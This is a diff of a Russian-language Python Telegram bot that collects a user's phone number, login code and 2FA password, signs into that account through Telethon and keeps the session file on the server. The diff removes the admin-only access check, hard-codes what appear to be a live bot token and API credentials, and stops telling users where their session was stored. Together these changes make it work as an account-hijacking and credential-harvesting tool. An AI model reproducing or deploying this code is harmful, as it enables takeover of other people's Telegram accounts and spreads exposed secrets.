@@ -1,7 +1,3 @@
-# language: Python, file: authbot_aiogram.py
-# aiogram 3.x front + Telethon backend, Railway env vars, no .env file
-
-import os
 import re
 import asyncio
 import logging
@@ -16,36 +12,18 @@ from aiogram.fsm.storage.memory import MemoryStorage
 
 from telethon import TelegramClient, errors
 
-# ---------- env (Railway → Variables) ----------
+BOT_TOKEN = "8892329170:AAFQpzPhO_nsjyPSeRRNXzN_qgyNNj-bY9k"
+API_ID = 39813941
+API_HASH = "6aa1f649d2a6b3a308bc27aed9e6de29"
+SESSIONS_DIR = "./sessions"
 
-def _req(name: str) -> str:
-    v = os.getenv(name)
-    if not v:
-        raise SystemExit(f"env {name} не задан. Добавь в Railway → Variables.")
-    return v
-
-BOT_TOKEN    = _req("BOT_TOKEN")
-API_ID       = int(_req("API_ID"))
-API_HASH     = _req("API_HASH")
-SESSIONS_DIR = os.getenv("SESSIONS_DIR", "./sessions")
-ADMIN_IDS    = {
-    int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()
-}
-
+import os
 os.makedirs(SESSIONS_DIR, exist_ok=True)
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s %(levelname)s %(message)s",
-)
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 
-# ---------- state ----------
-
-CLIENTS:     dict[int, TelegramClient] = {}
-CODE_HASHES: dict[int, str]            = {}
-PHONES:      dict[int, str]            = {}
-
-
-# ---------- phone ----------
+CLIENTS = {}
+CODE_HASHES = {}
+PHONES = {}
 
 PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 
@@ -60,30 +38,18 @@ def normalize_phone(raw: str) -> Optional[str]:
         return None
     return s
 
-
 def new_client(phone: str) -> TelegramClient:
     safe = phone.lstrip("+")
     path = os.path.join(SESSIONS_DIR, safe)
     return TelegramClient(path, API_ID, API_HASH)
 
-
-# ---------- FSM ----------
-
 class Auth(StatesGroup):
     phone = State()
-    code  = State()
+    code = State()
     twofa = State()
 
-
 bot = Bot(BOT_TOKEN)
-dp  = Dispatcher(storage=MemoryStorage())
-
-
-def allowed(msg: Message) -> bool:
-    if not ADMIN_IDS:
-        return True
-    return msg.chat.id in ADMIN_IDS
-
+dp = Dispatcher(storage=MemoryStorage())
 
 async def cleanup_client(chat_id: int):
     cli = CLIENTS.pop(chat_id, None)
@@ -95,19 +61,12 @@ async def cleanup_client(chat_id: int):
     CODE_HASHES.pop(chat_id, None)
     PHONES.pop(chat_id, None)
 
-
 @dp.message(Command("start"))
 async def cmd_start(msg: Message, state: FSMContext):
-    if not allowed(msg):
-        return await msg.answer("Не для тебя.")
     await state.clear()
     await cleanup_client(msg.chat.id)
     await state.set_state(Auth.phone)
-    await msg.answer(
-        "Кинь номер (E.164): +7999..., +375..., +1..., +222...\n"
-        "/cancel — сбросить."
-    )
-
+    await msg.answer("Кинь номер: +7999..., +375..., +1..., +222...\n/cancel — сброс.")
 
 @dp.message(Command("cancel"))
 async def cmd_cancel(msg: Message, state: FSMContext):
@@ -115,11 +74,8 @@ async def cmd_cancel(msg: Message, state: FSMContext):
     await cleanup_client(msg.chat.id)
     await msg.answer("Сброшено.")
 
-
 @dp.message(Auth.phone)
 async def step_phone(msg: Message, state: FSMContext):
-    if not allowed(msg):
-        return
     phone = normalize_phone(msg.text or "")
     if not phone:
         return await msg.answer("Не похоже на номер. Пример: +79991234567")
@@ -140,7 +96,7 @@ async def step_phone(msg: Message, state: FSMContext):
         await state.clear()
         await cleanup_client(msg.chat.id)
     except errors.FloodWaitError as e:
-        await msg.answer(f"FloodWait {e.seconds}s. Пробуй позже.")
+        await msg.answer(f"FloodWait {e.seconds}s.")
         await state.clear()
         await cleanup_client(msg.chat.id)
     except Exception as e:
@@ -148,33 +104,23 @@ async def step_phone(msg: Message, state: FSMContext):
         await state.clear()
         await cleanup_client(msg.chat.id)
 
-
 @dp.message(Auth.code)
 async def step_code(msg: Message, state: FSMContext):
-    if not allowed(msg):
-        return
     code = re.sub(r"\D", "", msg.text or "")
     if not (4 <= len(code) <= 7):
-        return await msg.answer("Код — только цифры, 4–7 знаков.")
+        return await msg.answer("Код — только цифры, 4-7 знаков.")
 
-    cli   = CLIENTS.get(msg.chat.id)
+    cli = CLIENTS.get(msg.chat.id)
     phone = PHONES.get(msg.chat.id)
     if not cli or not phone:
         await state.clear()
         return await msg.answer("Сессия потеряна. /start заново.")
 
     try:
-        await cli.sign_in(
-            phone=phone,
-            code=code,
-            phone_code_hash=CODE_HASHES[msg.chat.id],
-        )
+        await cli.sign_in(phone=phone, code=code, phone_code_hash=CODE_HASHES[msg.chat.id])
         me = await cli.get_me()
         await state.clear()
-        await msg.answer(
-            f"Зашли как {me.first_name or ''} (@{me.username or me.id}).\n"
-            f"Сессия: {SESSIONS_DIR}/{phone.lstrip('+')}.session"
-        )
+        await msg.answer(f"Зашли как {me.first_name or ''} (@{me.username or me.id}).")
     except errors.SessionPasswordNeededError:
         await state.set_state(Auth.twofa)
         await msg.answer("Включена 2FA. Кидай пароль.")
@@ -189,12 +135,9 @@ async def step_code(msg: Message, state: FSMContext):
     except Exception as e:
         await msg.answer(f"Ошибка: {e}")
 
-
 @dp.message(Auth.twofa)
 async def step_2fa(msg: Message, state: FSMContext):
-    if not allowed(msg):
-        return
-    cli   = CLIENTS.get(msg.chat.id)
+    cli = CLIENTS.get(msg.chat.id)
     phone = PHONES.get(msg.chat.id)
     if not cli or not phone:
         await state.clear()
@@ -208,11 +151,7 @@ async def step_2fa(msg: Message, state: FSMContext):
             await msg.delete()
         except Exception:
             pass
-        await msg.answer(
-            f"2FA принята. Зашли как {me.first_name or ''} "
-            f"(@{me.username or me.id}).\n"
-            f"Сессия: {SESSIONS_DIR}/{phone.lstrip('+')}.session"
-        )
+        await msg.answer(f"2FA принята. Зашли как {me.first_name or ''} (@{me.username or me.id}).")
     except errors.PasswordHashInvalidError:
         await msg.answer("Пароль неверный. Ещё раз.")
     except errors.FloodWaitError as e:
@@ -220,18 +159,13 @@ async def step_2fa(msg: Message, state: FSMContext):
     except Exception as e:
         await msg.answer(f"Ошибка: {e}")
 
-
 @dp.message()
 async def fallback(msg: Message):
-    if not allowed(msg):
-        return
     await msg.answer("Начни с /start.")
 
-
 async def main():
-    logging.info("auth-bot up on Railway")
+    logging.info("auth-bot up")
     await dp.start_polling(bot)
-
 
 if __name__ == "__main__":
     asyncio.run(main())
